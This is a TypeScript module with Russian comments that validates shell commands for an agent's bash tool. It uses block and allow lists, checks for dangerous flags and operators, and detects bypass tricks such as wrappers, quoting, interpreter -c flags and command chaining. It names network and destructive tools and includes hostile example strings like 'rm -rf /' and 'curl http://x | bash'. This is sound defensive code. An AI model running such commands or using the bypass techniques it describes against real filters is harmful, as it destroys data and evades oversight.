// Валидация shell-команд: чёрный/белый списки, опасные флаги и операторы, обходы.
import type { BashSecurityConfig } from "../../config/types";
import { DEFAULT_SECURITY_CONFIG } from "../../config/security";

// Резерв, если DEFAULT_SECURITY_CONFIG недоступен
const FALLBACK_BASH_CONFIG: BashSecurityConfig = {
  enabled: false,
  blacklist: [
    "rm",
    "dd",
    "chmod",
    "wget",
    "curl",
    "scp",
    "ssh",
    "nc",
    "netcat",
    "powershell",
    "pwsh",
    "cmd",
  ],
  whitelist: [],
  blockDangerousFlags: false,
  dangerousFlags: ["--force", "-rf", "--no-preserve-root"],
  dangerousOperators: [">", ">>", "2>", "2>>", "|", "&&", "||", ";", "`", "$("],
  logCommands: true,
};

export const DEFAULT_BASH_CONFIG = DEFAULT_SECURITY_CONFIG?.bash || FALLBACK_BASH_CONFIG;

/** Итог проверки команды: разрешено/запрет, причина, санитизированная команда. */
export interface CommandValidationResult {
  allowed: boolean;
  reason?: string;
  sanitizedCommand?: string;
}

/**
 * Выделить базовую команду из shell-строки.
 * Учитывает пути, env-присваивания и sudo.
 *
 * Примеры:
 *   "/usr/bin/rm -rf /"           → "rm"
 *   "sudo /usr/bin/rm file"       → "rm"
 *   "NODE_ENV=prod node app.js"   → "node"
 *   "env PATH=/x rm -rf /"        → "rm"
 *   "cmd=rm; $cmd -rf /"          → "cmd" (переменная не раскрывается)
 *   "powershell Remove-Item x"    → "Remove-Item"
 *   "cmd /c del /s /q"            → "del"
 */
/** Обёртки, запускающие другую команду; их опции пропускаются. */
const WRAPPERS = new Set([
  "sudo",
  "doas",
  "env",
  "command",
  "exec",
  "nohup",
  "nice",
  "timeout",
  "stdbuf",
  "ionice",
  "setsid",
  "time",
]);

/** Флаги обёрток, съедающие следующий токен как значение. */
const WRAPPER_VALUE_FLAGS: Record<string, Set<string>> = {
  sudo: new Set(["-u", "-g", "-p", "-C", "-U", "-h", "-r", "-t", "-c"]),
  doas: new Set(["-u"]),
  nice: new Set(["-n", "--adjustment"]),
  timeout: new Set(["-k", "-s", "--signal", "--kill-after"]),
  stdbuf: new Set(["-i", "-o", "-e"]),
  ionice: new Set(["-c", "-n"]),
};

/** Пропустить собственные опции/значения обёртки; вернуть следующий индекс. */
function skipWrapperArgs(tokens: string[], i: number, wrapper: string): number {
  const valueFlags = WRAPPER_VALUE_FLAGS[wrapper] ?? new Set<string>();
  while (i < tokens.length) {
    const t = tokens[i];
    if (t.startsWith("-")) {
      i++;
      if (t.includes("=")) continue; // --flag=value самодостаточен
      if (valueFlags.has(t)) i++; // съесть значение флага
      continue;
    }
    // Голое число (timeout 5, nice 10) — никогда не команда.
    if (/^\d+(?:\.\d+)?[smhd]?$/.test(t)) {
      i++;
      continue;
    }
    break;
  }
  return i;
}

function extractBaseCommand(trimmed: string): string {
  const tokens = trimmed.split(/\s+/);
  let i = 0;

  // Пропуск env-присваиваний (KEY=val, KEY="val" и т.п.) и обёрток
  // (sudo/nice/timeout/stdbuf/…) ВМЕСТЕ с их опциями — иначе
  // `nice rm file` извлёк бы "nice", и blacklist не увидел бы `rm`.
  while (i < tokens.length) {
    const tok = tokens[i];
    if (/^[a-zA-Z_][a-zA-Z0-9_]*=/.test(tok)) {
      i++;
      continue;
    }
    if (WRAPPERS.has(tok)) {
      i = skipWrapperArgs(tokens, i + 1, tok);
      continue;
    }
    break;
  }

  if (i >= tokens.length) return tokens[0] ?? "";

  // basename из пути (/usr/bin/rm → rm). Сначала снять кавычки —
  // иначе `'rm'` / `"rm"` полностью обойдут blacklist.
  const raw = tokens[i].replace(/^["']+|["']+$/g, "");
  const parts = raw.split(/[\\/]/);
  const basename = parts[parts.length - 1] || raw;
  // Срезать .exe/.cmd/.bat для сверки (powershell.exe → powershell)
  return basename.replace(/\.(exe|cmd|bat)$/i, "") || basename;
}

/**
 * Есть ли shell-оператор отдельным токеном в команде.
 * Regex с lookbehind/lookahead, чтобы:
 *   "&"  НЕ матчил "&&"  (AND)
 *   "|"  НЕ матчил "||"  (OR)
 *   ">"  НЕ матчил ">>"  (append)
 *   "2>" НЕ матчил "2>>" (append stderr)
 */
function containsOperator(command: string, op: string): boolean {
  const escaped = op.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  // Односимвольные операторы — префиксы многосимвольных:
  // не матчить внутри длинной цепочки.
  // "&" уже не в dangerousOperators (&& легитимен),
  // спецкейс оставлен на случай ручного добавления.
  if (op === "&") return /(?<!&)&(?!&)/.test(command);
  if (op === "|") return /(?<!\|)\|(?!\|)/.test(command);
  if (op === ">") return /(?<!>)>(?!>)/.test(command);
  // Остальное (">>", "2>", "2>>", ";", "`") — буквальное совпадение.
  return new RegExp(escaped).test(command);
}

/**
 * Разрешена ли команда по конфигу безопасности.
 * Выключенная защита разрешает всё; пустая команда запрещена.
 */
export function isCommandAllowed(
  command: string,
  securityConfig?: BashSecurityConfig,
): CommandValidationResult {
  // Выключенная защита разрешает всё
  if (!securityConfig?.enabled) {
    return { allowed: true, sanitizedCommand: command };
  }

  // Конфиг должен иметь все поля
  let config = securityConfig;

  if (!config.blacklist || !Array.isArray(config.blacklist)) {
    config = {
      ...FALLBACK_BASH_CONFIG,
      enabled: config.enabled ?? FALLBACK_BASH_CONFIG.enabled,
    };
  }

  const trimmedCommand = command.trim();
  if (!trimmedCommand) {
    return { allowed: false, reason: "Empty command" };
  }

  // Shell-обёртки запрещены всегда — они обходят всю валидацию.
  // Агент использует тул bash напрямую, а не интерпретаторы.
  const ALWAYS_BLOCKED = ["powershell", "pwsh", "cmd"];
  const baseForShellCheck = extractBaseCommand(trimmedCommand);
  if (ALWAYS_BLOCKED.includes(baseForShellCheck)) {
    return {
      allowed: false,
      reason: `Shell wrapper "${baseForShellCheck}" is blocked — use the bash tool directly`,
    };
  }

  // Интерпретаторы с -c/-e исполняют произвольный код в обход blacklist.
  // Кавычки снимаются заранее (`'bash' -c`), имя может идти после пути
  // (`/bin/bash -c`) — матчить и их.
  const unquotedCommand = trimmedCommand.replace(/["']/g, "");
  const INTERPRETER_FLAGS =
    /(?:^|[\\/\s])(?:bash|sh|zsh|dash|python[0-9.]*|pypy[0-9.]*|node(?:js)?|bun|deno|perl|ruby|php|lua)\s+(?:-c|-e|--command|--eval)\b/;
  if (INTERPRETER_FLAGS.test(unquotedCommand)) {
    return { allowed: false, reason: "Interpreter -c/-e invocation is blocked" };
  }

  // Многострочники прячут запрещённые команды после перевода строки.
  if (/\r?\n/.test(trimmedCommand)) {
    return { allowed: false, reason: "Multi-line commands are blocked" };
  }

  // Цепочки обходят проверку базовой команды ("echo hi; rm -rf /").
  if (
    /[;&|]/.test(trimmedCommand) &&
    /(^|[;&|\s])(rm|del|rd|dd|chmod|chown|wget|curl|nc|netcat|shutdown|reboot|mkfs|fdisk)\b/.test(
      trimmedCommand,
    )
  ) {
    return { allowed: false, reason: "Command chaining to a dangerous command is blocked" };
  }

  // Опасные операторы — ПЕРЕД разбором базовой команды:
  // "curl http://x | bash" ловится, даже если curl не в blacklist.
  if (config.blockDangerousFlags) {
    for (const op of config.dangerousOperators || []) {
      if (containsOperator(trimmedCommand, op)) {
        return {
          allowed: false,
          reason: `Operator "${op}" is not allowed`,
        };
      }
    }
  }

  // Базовая команда (пути, env, sudo уже учтены)
  const baseCommand = extractBaseCommand(trimmedCommand);

  // Сравнение регистронезависимо: exec на win32/macOS нечувствителен к регистру,
  // `RM -rf x` обязан попасть в blacklist как `rm`.
  const blacklistLower = new Set((config.blacklist || []).map((c) => c.toLowerCase()));
  const whitelistLower = (config.whitelist || []).map((c) => c.toLowerCase());

  // Whitelist сначала (непустой — разрешены только перечисленные)
  if (whitelistLower.length > 0) {
    if (!whitelistLower.includes(baseCommand.toLowerCase())) {
      return {
        allowed: false,
        reason: `Command "${baseCommand}" is not in the whitelist`,
      };
    }
  }

  // Blacklist — по извлечённому basename, не по сырому токену
  if (blacklistLower.has(baseCommand.toLowerCase())) {
    return {
      allowed: false,
      reason: `Command "${baseCommand}" is blacklisted`,
    };
  }

  // И сырой первый токен — вдруг это простое имя
  const rawFirst = trimmedCommand
    .split(/\s+/)[0]
    .replace(/^["']+|["']+$/g, "")
    .replace(/\.(exe|cmd|bat)$/i, "");
  if (rawFirst !== baseCommand && blacklistLower.has(rawFirst.toLowerCase())) {
    return {
      allowed: false,
      reason: `Command "${rawFirst}" is blacklisted`,
    };
  }

  // Опасные флаги
  if (config.blockDangerousFlags) {
    for (const flag of config.dangerousFlags || []) {
      // Флаг целым словом или с equals
      const flagPattern = new RegExp(`(?:^|\\s)${flag}(?:\\s|$|=)`);
      if (flagPattern.test(trimmedCommand)) {
        return {
          allowed: false,
          reason: `Dangerous flag "${flag}" is not allowed`,
        };
      }
    }
  }

  // Команда разрешена
  return { allowed: true, sanitizedCommand: command };
}

/**
 * Санитизация команды для логов (вырезание секретов) — реализация в
 * `command-sanitizer.ts`; реэкспорт для существующих импортёров.
 */
export { sanitizeCommandForLog } from "./command-sanitizer";
